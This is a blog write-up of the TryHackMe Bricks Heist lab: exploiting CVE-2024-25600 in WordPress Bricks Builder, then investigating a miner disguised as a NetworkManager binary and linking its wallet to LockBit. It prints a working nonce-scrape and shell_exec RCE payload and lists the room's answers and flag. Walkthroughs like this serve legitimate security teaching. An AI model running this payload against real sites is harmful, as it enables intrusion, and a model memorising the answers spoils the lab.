---
title: "TryHackMe Bricks Heist: CVE-2024-25600 RCE to cryptominer forensics"
date: 2026-11-06T08:17:00+05:30
lastmod: 2026-11-06T08:17:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-bricksheist/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - CVE-2024-25600
  - WordPress
  - Bricks Builder
  - cryptomining
  - forensics
  - RCE
  - LockBit

draft: false
description: "TryHackMe Bricks Heist walkthrough: exploiting CVE-2024-25600 in WordPress Bricks Builder for RCE, tracing a disguised cryptominer and its LockBit-linked wallet."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|TryHack3M: Bricks Heist |![TryHack3M: Bricks Heist room icon](https://cdn-images.tryhackme.com/room-icons/0a46e92e8a9255f7dde294569e05dae1.png)|

This easy challenge from the TryHack3M series drops you onto a compromised WordPress server running Bricks Builder 1.9.5. Your job is to exploit CVE-2024-25600 (unauthenticated RCE), identify the cryptominer hiding as a NetworkManager component, decode its triple-encoded wallet address, and attribute the wallet to a known threat group.

## Task 1: Challenge

The room provides a single task with six questions spanning the full kill chain: initial access through the Bricks Builder RCE, process identification, service persistence, log analysis, wallet extraction, and threat intelligence attribution.

### Initial access: CVE-2024-25600

WordPress 6.5 with Bricks Builder <= 1.9.6 exposes an unauthenticated RCE through the `/wp-json/bricks/v1/render_element` REST endpoint. The `render_element` handler evaluates PHP code embedded in the `code` element's settings when `executeCode` is set to `true`. All it needs is a valid nonce, which the theme leaks in the page source.

Grabbing the nonce from the rendered page:

```bash
curl -sk https://bricks.thm/ | grep -oP 'nonce":"\K[a-f0-9]+'
  # 2a96b2a504
```

With the nonce in hand, every command runs as the `apache` user:

```bash
curl -sk 'https://bricks.thm/wp-json/bricks/v1/render_element' \
  -H 'Content-Type: application/json' \
  -d '{"postId":"1","nonce":"REDACTED","element":{"name":"code",
  "settings":{"executeCode":"true",
  "code":"<?php echo shell_exec(\"id\"); ?>"}}}'
  # uid=48(apache) gid=48(apache) groups=48(apache)
```

### Finding the hidden flag

A quick `find` in the web root reveals a `.txt` file with a hash-based name:

```bash
find /data/www/default/ -name "*.txt" -type f
  # /data/www/default/650c844110baced87e1606453b93f22a.txt
cat /data/www/default/650c844110baced87e1606453b93f22a.txt
  # THM{fl46_REDACTED}
```

**What is the content of the hidden .txt file in the web folder? THM{fl46_650c844110baced87e1606453b93f22a}**

### Identifying the miner process

Listing running services surfaces `ubuntu.service` with the description "TRYHACK3M," which stands out from the legitimate system services:

```bash
systemctl list-units --type=service --state=running | grep -i try
  # ubuntu.service loaded active running TRYHACK3M
```

The service unit file at `/etc/systemd/system/ubuntu.service` reveals the executable:

```ini
[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure
```

The binary `nm-inet-dialog` is a 6.9 MB ELF disguised among legitimate NetworkManager helpers. Running `file` on it confirms it is a PyInstaller-packed Python application, not a real NetworkManager component.

**What is the name of the suspicious process? nm-inet-dialog**

**What is the service name affiliated with the suspicious process? ubuntu.service**

{{< ad >}}

### The miner log

Alongside the binary, `/lib/NetworkManager/inet.conf` is a 66 KB log file recording the miner's activity:

```
ID: 5757314e65474e59624...54303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
```

The `ID` field at the top of the log is the wallet address, triple-encoded: hex, then base64 twice.

**What is the log file name of the miner instance? inet.conf**

### Decoding the wallet address

The `ID` value is a hex string. Decoding it step by step:

```python
import base64
hex_str = "5757314e65474e596248...54303d"
step1 = bytes.fromhex(hex_str).decode()       # base64 string
step2 = base64.b64decode(step1).decode()       # another base64 string
step3 = base64.b64decode(step2).decode()       # raw wallet(s)
  # bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa...
```

The final decoded string is 85 characters: two wallet addresses concatenated, the first 42 characters being a valid Bitcoin bech32 (P2WPKH) address.

**What is the wallet address of the miner instance? bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa**

### Threat group attribution

Searching blockchain intelligence sources for the wallet `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` reveals transactions linking it to wallets attributed to LockBit, the ransomware-as-a-service operation known for both encryption-based extortion and, in some campaigns, cryptojacking as a secondary monetization channel.

**The wallet address used has been involved in transactions between wallets belonging to which threat group? LockBit**

## Takeaways

1. **A leaked nonce turns a theme feature into full RCE.** Bricks Builder's `render_element` endpoint was designed for legitimate code rendering in the page builder. The vulnerability (CVE-2024-25600) exists because the endpoint trusts a nonce that the theme itself embeds in the public-facing HTML, making it trivially extractable by any unauthenticated attacker. The fix in Bricks 1.9.6.1 added permission checks beyond the nonce.

2. **Miners hide in plain sight by mimicking system binaries.** Placing `nm-inet-dialog` inside `/lib/NetworkManager/` alongside real NM binaries, naming the log `inet.conf` to blend with configuration files, and registering the service as `ubuntu.service` all make the miner harder to spot in a quick `ls` or `systemctl` listing. The tell is the binary size (6.9 MB, far larger than real NM helpers) and the PyInstaller signature in its strings.

Room solved 100%: 1 task, 6 answers.
